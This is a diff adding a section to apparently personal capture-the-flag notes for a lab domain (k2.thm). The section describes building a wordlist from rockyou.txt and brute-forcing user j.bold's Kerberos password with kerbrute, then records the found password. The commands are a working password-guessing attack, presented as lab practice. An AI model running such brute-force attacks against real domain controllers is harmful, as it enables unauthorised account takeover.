@@ -9,3 +9,31 @@ From the notes you found on [[Shell as R.Bud]] you know:
 4. At least `1 special character` which is what the password is missing.
 5. Any `number between 0-999` which also what the password is missing.
 
+## James' password
+
+#Attaking_Machine 
+
+1. The word `rockyou` can be found on `rockyou.txt` so y ou can  to look at any password that contains that.
+
+```
+grep -i rockyou rockyou.txt | wc -w
+```
+
+  The result is: 7640
+
+2. Copy all those words to a file.
+```
+cat /usr/share/wordlists/rockyou.txt | grep -i rockyou > rocks.txt
+```
+
+3. Bruteforce `j.bold` password with the `rocks.txt` file.
+
+```
+~/tools/kerbrute_linux_amd64 bruteuser -d k2.thm --dc <MACHINE IP> rocks.txt j.bold
+```
+
+![[j.bold.png]]
+
+j.bold's password is `#8rockyou`.
+
+**Next step:** [[Lateral Movement II]]
